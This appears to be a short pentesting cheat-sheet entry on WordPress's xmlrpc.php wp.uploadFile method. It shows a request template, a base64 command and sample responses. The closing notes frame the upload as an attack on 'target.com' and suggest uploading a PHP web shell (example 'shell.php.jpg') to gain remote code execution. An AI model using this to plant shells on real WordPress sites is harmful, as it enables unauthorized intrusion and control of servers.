### Uploading a file via `xmlrpc.php`
- Uploading a file if the username and password are correct.

```xml
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
	<methodName>wp.uploadFile</methodName>
	<params>
		<param><value><string>1</string></value></param>
		<param><value><string>username</string></value></param>
		<param><value><string>password</string></value></param>
		<param>
			<value>
				<struct>
					<member>
						<name>name</name>
						<value><string>filename.jpg</string></value>
					</member>
					<member>
						<name>type</name>
						<value><string>mime/type</string></value>
					</member>
					<member>
						<name>bits</name>
						<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```

- Replace `---base64-encoded-data---` with your base64 file content.

---

### How to convert a file to base64?

```bash
base64 filename.jpg > output.txt
```

Then replace the content of `output.txt` in the payload.

---

### Invalid response example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
	<fault>
		<value>
			<struct>
				<member>
					<name>faultCode</name>
					<value><int>403</int></value>
				</member>
				<member>
					<name>faultString</name>
					<value><string>Incorrect username or password.</string></value>
				</member>
			</struct>
		</value>
	</fault>
</methodResponse>
```

---

### Successful response example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
	<params>
		<param>
			<value>
				<struct>
					<member>
						<name>id</name>
						<value><string>722</string></value>
					</member>
					<member>
						<name>file</name>
						<value><string>filename.jpg</string></value>
					</member>
					<member>
						<name>url</name>
						<value><string>http://target.com/wp-content/uploads/2013/05/filename.jpg</string></value>
					</member>
					<member>
						<name>type</name>
						<value><string>mime/type</string></value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodResponse>
```

---

### Notes:
- Once the file is uploaded, the server responds with the uploaded file path.
- You can access it directly in your browser.
- Example: `http://target.com/wp-content/uploads/2025/04/shell.php.jpg`
- Try uploading a PHP file and achieve **Remote Code Execution (RCE)**.
